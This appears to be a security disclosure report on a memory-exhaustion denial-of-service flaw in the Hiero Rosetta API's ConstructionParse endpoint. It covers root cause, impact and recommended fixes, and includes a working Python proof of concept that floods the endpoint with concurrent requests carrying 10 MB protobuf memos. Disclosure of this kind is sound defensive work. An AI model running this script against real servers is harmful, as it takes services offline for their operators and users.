### Title
Unbounded Memo Field in `ConstructionParse` Enables Memory Exhaustion via Crafted Transaction Bytes

### Summary
`ConstructionParse()` in `rosetta/app/services/construction_service.go` deserializes an attacker-controlled hex transaction string via `hiero.TransactionFromBytes()` and unconditionally stores the resulting memo string in a response metadata map with no size validation. The Rosetta HTTP server imposes no body-size cap (`MaxBytesReader` is absent), so an unprivileged attacker can send concurrent requests carrying protobuf-encoded transactions with arbitrarily large memo fields, exhausting process memory and causing a denial of service.

**Root cause:** `hiero.TransactionFromBytes()` is a pure protobuf deserialization call. The Hedera/Hiero SDK enforces the 100-byte memo limit only when building a transaction via `SetTransactionMemo()`, not during deserialization from raw bytes. A crafted protobuf payload can therefore carry a memo of arbitrary size (megabytes). After deserialization, `isSupportedTransactionType()` checks only the transaction type (`TransferTransaction` or `AccountCreateTransaction`) — it performs no field-level validation. The memo string is then stored in the `metadata` map and serialized into the JSON response, with no length check at any point.

**HTTP layer:** `rosetta/main.go` lines 220–227 configure the `http.Server` with `ReadTimeout` (default 5 s) and `ReadHeaderTimeout` (default 3 s) but no `MaxBytesReader` or equivalent body-size cap. The rosetta-sdk-go router decodes the JSON body with `json.NewDecoder(r.Body).Decode()` without a size limit, so the entire body is buffered into memory before the handler is invoked.

**Failed assumption:** The code assumes that any transaction successfully deserialized by `TransactionFromBytes()` carries only protocol-compliant field values. This is false: the SDK does not re-validate field constraints during deserialization.

### Impact Explanation
Each crafted request allocates memory proportional to the memo size: the raw JSON body (hex-encoded, ~2× memo size), the decoded byte slice (~1× memo size), the deserialized transaction object (~1× memo size), and the metadata map entry (~1× memo size). A 10 MB memo therefore consumes ~50 MB per in-flight request. With N concurrent connections the server allocates ~50N MB before any request completes. At N = 100 concurrent requests the server requires ~5 GB, which exhausts typical container/VM memory and causes an OOM kill or severe GC pressure, taking the Rosetta node offline. Because the endpoint is unauthenticated and available in both online and offline modes, the attack requires no credentials.

### Likelihood Explanation
The `/construction/parse` endpoint is a standard, publicly documented Rosetta API endpoint that requires no authentication. Crafting a valid protobuf `TransferTransaction` with an oversized memo is trivial using any protobuf library. The attacker needs only moderate bandwidth (a 10 MB body sent in under 5 s requires ~16 Mbps) and a tool capable of issuing concurrent HTTP requests (e.g., `curl`, `wrk`, or a short script). The attack is fully repeatable and requires no privileged access, no on-chain funds, and no knowledge of private keys.

### Recommendation
1. **Add an HTTP body-size limit** in `rosetta/main.go` using `http.MaxBytesReader` in a middleware wrapper before the router, e.g., limit request bodies to 64 KB (sufficient for any legitimate Rosetta construction request).
2. **Validate memo length** immediately after `TransactionGetTransactionMemo()` in `ConstructionParse()` — reject or truncate memos exceeding 100 bytes (the Hedera protocol maximum) before storing them in the metadata map.
3. **Apply the same guard** in `ConstructionCombine()` and any other path that calls `unmarshallTransactionFromHexString()`.

### Proof of Concept
```python
import struct, socket, threading, binascii, json, requests

# Build a minimal TransferTransaction protobuf with a 10 MB memo.
# TransactionBody field 9 (memo) is a length-delimited string.
# Wrap in SignedTransaction (field 1 = body_bytes) and Transaction (field 4 = signed_transaction_bytes).
memo = b"A" * 10_000_000          # 10 MB memo

def encode_varint(n):
    buf = b""
    while n > 0x7F:
        buf += bytes([(n & 0x7F) | 0x80])
        n >>= 7
    buf += bytes([n])
    return buf

def ldelim(field_num, data):
    tag = (field_num << 3) | 2
    return encode_varint(tag) + encode_varint(len(data)) + data

# TransactionBody: field 9 = memo, field 11 = cryptoTransfer (empty)
tx_body = ldelim(9, memo) + ldelim(11, b"")
# SignedTransaction: field 1 = body_bytes
signed_tx = ldelim(1, tx_body)
# Transaction: field 4 = signed_transaction_bytes
transaction = ldelim(4, signed_tx)

tx_hex = "0x" + binascii.hexlify(transaction).decode()

payload = {
    "network_identifier": {"blockchain": "Hiero", "network": "testnet"},
    "signed": False,
    "transaction": tx_hex
}

def send():
    try:
        requests.post("http://<rosetta-host>:5700/construction/parse",
                      json=payload, timeout=10)
    except Exception:
        pass

# Fire 50 concurrent requests
threads = [threading.Thread(target=send) for _ in range(50)]
for t in threads: t.start()
for t in threads: t.join()
# Expected result: server OOM or severe latency degradation

func unmarshallTransactionFromHexString(transactionString string) (hiero.TransactionInterface, *rTypes.Error) {
	transactionBytes, err := hex.DecodeString(tools.SafeRemoveHexPrefix(transactionString))
	if err != nil {
		return nil, errors.ErrTransactionDecodeFailed
	}

	transaction, err := hiero.TransactionFromBytes(transactionBytes)
	if err != nil {
		return nil, errors.ErrTransactionUnmarshallingFailed
	}

	if rErr := isSupportedTransactionType(transaction); rErr != nil {
		return nil, rErr
	}

	return transaction, nil
}
